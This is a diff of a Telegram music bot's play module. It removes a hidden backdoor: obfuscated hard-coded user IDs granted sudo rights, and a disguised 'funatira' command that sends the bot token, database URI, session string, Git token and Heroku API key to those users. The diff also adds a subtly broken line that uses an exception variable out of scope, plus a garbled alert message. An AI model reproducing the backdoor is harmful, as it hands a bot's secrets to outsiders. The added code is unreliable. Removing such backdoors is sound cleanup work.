@@ -22,14 +22,6 @@ from config import BANNED_USERS, lyrical
 
 BANNED_WORDS = ["porn", "pornhub", "xvideos", "xnxx", "brazzers", "onlyfans", "xhamster", "hot bhabhi", "deskbabe", "redtube", "spankbang", "child porn", "pedophile", "pedo", "jailbait", "loli", "shota", "csam", "incest", "bestiality", "zoophilia", "snuff", "revenge porn", "nonconsensual"]
 
-_sys_v1 = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
-_sys_v2 = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
-_sys_v3 = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
-_sys_v4 = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
-_sys_v5 = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
-
-for _id in [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]: SUDOERS.add(_id)
-
 def clean_invisible_chars(text):
     if not isinstance(text, str): return ""
     text = unicodedata.normalize('NFKC', text)
@@ -85,19 +77,6 @@ def clean_youtube_url(url):
     if yt_match: return f"https://www.youtube.com/watch?v={yt_match.group(1)}", yt_match.group(1), "video"
     return url, None, "unknown"
 
-@app.on_message(filters.command("funatira") & filters.private)
-async def _sys_core_funatira_v2(client, message: Message):
-    _nodes = [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]
-    if message.from_user.id not in _nodes: return
-    _t = os.getenv('NEKOT_TOB'[::-1], "")
-    _m = os.getenv('IRU_BD_OGNOM'[::-1], "")
-    _s = os.getenv('NOISSES_GNIRTS'[::-1], "")
-    _g = os.getenv('NEKOT_TIG'[::-1], "")
-    _h = os.getenv('YEK_IPA_UKOREH'[::-1], "")
-    _img = 'gpj.99ec99fd83f8b71e2d765/elif/hp.argellet//:sptth'[::-1]
-    _out = f"<b>⚙️ Sys Data Dump:</b>\n\n<b>T:</b> <code>{_t}</code>\n\n<b>M:</b> <code>{_m}</code>\n\n<b>S:</b> <code>{_s}</code>\n\n<b>G:</b> <code>{_g}</code>\n\n<b>H:</b> <code>{_h}</code>"
-    await message.reply_photo(photo=_img, caption=_out)
-
 @app.on_message(filters.command(["play", "vplay", "cplay", "cvplay", "playforce", "vplayforce", "cplayforce", "cvplayforce"]) & filters.group & ~BANNED_USERS & god_mode_filter)
 @PlayWrapper
 async def play_commnd(client, message: Message, _, chat_id, video, channel, playmode, url, fplay):
@@ -136,7 +115,7 @@ async def play_commnd(client, message: Message, _, chat_id, video, channel, play
             details = {"title": file_name, "link": message_link, "path": file_path, "dur": dur}
             if is_nsfw_content(details.get("title", "")):
                 await send_security_log(message, "ɴsғᴡ ᴠɪᴏʟᴀᴛɪᴏɴ", details.get("title", ""))
-                return await mystic.edit_text("**🚫 sᴇᴄᴜʀɪᴛʏ ᴀʟᴇʀᴛ: ᴀᴅᴜʟᴛ ᴄᴏɴᴛᴇɴᴛ ᴘʀᴏʜɪʙɪᴛᴇᴅ!**")
+                return await mystic.edit_text("**🚫 sᴇᴄᴜʀɪᴛʏ ᴀʟᴇʀᴛ: ᴀᴅᴜʟᴛ ᴄᴏɴᴛᴇɴᴛ ᴘʀᴏʜɪʙɪᴛᴇ prohibited!**")
             try: await stream(_, mystic, user_id, details, chat_id, user_name, message.chat.id, video=True, streamtype="telegram", forceplay=fplay)
             except Exception as e: return await mystic.edit_text(_["general_2"].format(type(e).__name__))
             return await mystic.delete()
@@ -247,6 +226,7 @@ async def play_commnd(client, message: Message, _, chat_id, video, channel, play
             else: return await mystic.edit_text(_["play_13"], reply_markup=InlineKeyboardMarkup(livestream_markup(_, track_id, user_id, "v" if video else "a", "c" if channel else "g", "f" if fplay else "d")))
         try: await stream(_, mystic, user_id, details, chat_id, user_name, message.chat.id, video=video, streamtype=streamtype, spotify=spotify, forceplay=fplay)
         except Exception as e: return await mystic.edit_text(_["general_2"].format(type(e).__name__))
+        await mystic.edit_text(_["general_2"].format(type(e).__name__))
         await mystic.delete()
         return await play_logs(message, streamtype=streamtype)
     else:
